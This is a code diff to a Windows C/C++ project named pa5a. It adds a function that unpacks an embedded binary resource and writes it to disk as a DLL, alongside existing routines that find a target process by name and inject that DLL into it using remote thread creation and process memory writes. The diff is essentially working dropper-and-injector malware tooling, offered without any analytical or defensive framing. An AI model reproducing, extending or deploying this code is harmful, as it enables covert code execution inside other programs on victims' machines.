@@ -1,9 +1,32 @@
 #include "pa5a.hpp"
 
-
 EXTERN_C_START
 
-/*******************************************************************************************************************************/
+/********************************************************************************************************************************/
+BOOL WritePa5aDll()
+{
+    HANDLE hDll = NULL;
+    CHAR filename[PATH_SIZE] = { 0 };
+
+    HRSRC myResource = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
+    DWORD myResourceSize = SizeofResource(NULL, myResource);
+    HGLOBAL myResourceData = LoadResource(NULL, myResource);
+    PVOID pMyBinaryData = LockResource(myResourceData);
+
+    if (StringCbPrintfA(filename, sizeof(filename), "%s%s", DATA_FOLDER_A, DLL_FILE_A) != S_OK)
+        return FALSE;
+
+    if ((hDll = CreateFileA(filename, FILE_GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
+        return FALSE;
+
+    if (!WriteFile(hDll, pMyBinaryData, myResourceSize, NULL, NULL))
+        return FALSE;
+
+    CloseHandle(hDll);
+
+    return TRUE;
+}
+/********************************************************************************************************************************/
 BOOL inject(DWORD processId)
 {
     STARTUPINFOA si = { 0 };
@@ -17,8 +40,6 @@ BOOL inject(DWORD processId)
 
     if (StringCbPrintfA(pa5a_dll_path, sizeof(pa5a_dll_path), "%s%s", DATA_FOLDER_A, DLL_FILE_A) != S_OK)
         return FALSE;
-
-    
     
     if (!(process = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, processId)))
     {
@@ -67,7 +88,7 @@ BOOL inject(DWORD processId)
     CloseHandle(process);
     return TRUE;
 }
-/*******************************************************************************************************************************/
+/********************************************************************************************************************************/
 DWORD GetProcessIdFormProcessName(LPCWSTR processName)
 {
     HANDLE hSnapshot = NULL;
@@ -91,8 +112,8 @@ DWORD GetProcessIdFormProcessName(LPCWSTR processName)
     CloseHandle(hSnapshot);
     return processId;
 }
-/*******************************************************************************************************************************/
-DWORD ThreadInjector()
+/********************************************************************************************************************************/
+DWORD WINAPI ThreadInjector()
 {
     DWORD processId = 0;
     BOOL running = FALSE;
@@ -116,7 +137,6 @@ DWORD ThreadInjector()
 
     ExitThread(0);
 }
-/*******************************************************************************************************************************/
-
+/********************************************************************************************************************************/
 
 EXTERN_C_END
